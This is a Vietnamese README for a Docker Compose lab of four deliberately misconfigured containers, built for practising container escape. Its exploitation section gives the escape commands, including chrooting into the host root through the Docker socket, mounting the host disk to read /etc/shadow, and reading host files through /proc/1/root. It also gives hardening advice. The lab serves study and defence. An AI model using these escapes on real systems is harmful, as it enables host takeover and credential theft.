# Docker Escape Lab

Lab Docker Compose gồm bốn container cấu hình hở sẵn để thực hành thoát khỏi container trên máy Linux hoặc WSL2.

<p align="center">
  <img src="https://img.shields.io/badge/Docker-20.10%2B-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker" />
  <img src="https://img.shields.io/badge/Linux-Kernel_5.x%2B-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Linux" />
  <img src="https://img.shields.io/badge/Security-Container_Escape-E95420?style=for-the-badge" alt="Security" />
  <img src="https://img.shields.io/badge/License-MIT-success?style=for-the-badge" alt="License MIT" />
</p>

<p align="center"><a href="README.md">English</a> · <strong>Tiếng Việt</strong></p>

> Lab này tôi tự dựng với bốn lỗi cấu hình cố ý để thực hành thoát container trên máy cá nhân. Không chạy các kỹ thuật này lên hệ thống bạn không sở hữu hoặc chưa được cấp phép.

## Tổng quan

Mỗi service trong `docker-compose.yml` tách riêng một lỗi cấu hình hay gặp ngoài thực tế và đặt sẵn một file flag từ `/flag1.txt` đến `/flag4.txt`:

| # | Service | Lỗi cấu hình | Hướng thoát ra host |
|---|---|---|---|
| 1 | `lab-sock-escape` | `-v /var/run/docker.sock:...` | Tạo container mới mount `/` của host rồi `chroot` |
| 2 | `lab-privileged-escape` | `privileged: true` | Mount thẳng phân vùng ổ đĩa host (`/dev/sda`) |
| 3 | `lab-pid-escape` | `pid: host` + `SYS_PTRACE` | Đi xuyên sang rootfs của host qua `/proc/1/root` |
| 4 | `lab-volume-escape` | `-v /:/host:rw` | Ghi thẳng vào cron hoặc SSH key của host |

## Tự chạy tái lập

Yêu cầu: đã cài Docker và Docker Compose v2 trở lên trên Linux hoặc Windows WSL2.

```bash
git clone https://github.com/Khanh1916/docker-escape-lab.git
cd docker-escape-lab
docker compose up -d
```

Kiểm tra cả bốn container đã chạy:

```bash
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Image}}"
```

Chạy script kiểm tra nhanh bốn cấu hình hở:

```bash
sh scripts/verify_all.sh
```

## Các bước khai thác

### 1. Docker daemon socket

```bash
docker exec -it lab-sock-escape bash

# Dùng Docker CLI
docker run --rm -it -v /:/host alpine chroot /host

# Hoặc gọi trực tiếp qua curl nếu không có CLI
curl -s --unix-socket /var/run/docker.sock http://localhost/version
```

### 2. Container chạy privileged

```bash
docker exec -it lab-privileged-escape bash
lsblk
mkdir -p /mnt/host_disk
mount /dev/sda /mnt/host_disk
head -n 5 /mnt/host_disk/etc/shadow
```

### 3. Dùng chung PID namespace với host

```bash
docker exec -it lab-pid-escape bash
ps aux | head -n 10
ls -la /proc/1/root/
head -n 5 /proc/1/root/etc/passwd
```

### 4. Mount thư mục nhạy cảm của host

```bash
docker exec -it lab-volume-escape sh
ls -la /host
echo "Escaped via Volume Mount" > /host/tmp/proof_escape.txt
```

## Phòng thủ ra sao

Không mount `/var/run/docker.sock` vào container app hay runner CI. Nếu cần build image thì chuyển sang Kaniko hoặc Buildah, còn nếu chỉ đọc thông tin container thì đặt `tecnativa/docker-socket-proxy` chặn phía trước và chỉ mở API `GET`. Cấm dùng `privileged: true`, drop hết capability bằng `--cap-drop=ALL`, và gắn `:ro` cho volume nào chỉ cần đọc. Ngoài ra nên bật `userns-remap` trong `/etc/docker/daemon.json` (hoặc chạy Rootless Docker / Podman) đi kèm `--read-only --tmpfs /tmp`.

## Dọn dẹp

```bash
docker compose down
```

## Bài viết chi tiết & Giấy phép

Phân tích đầy đủ từng bước và cơ chế kernel xem tại: [khanh1916.github.io/notes](https://khanh1916.github.io/notes)

Dự án phát hành theo [Giấy phép MIT](LICENSE).
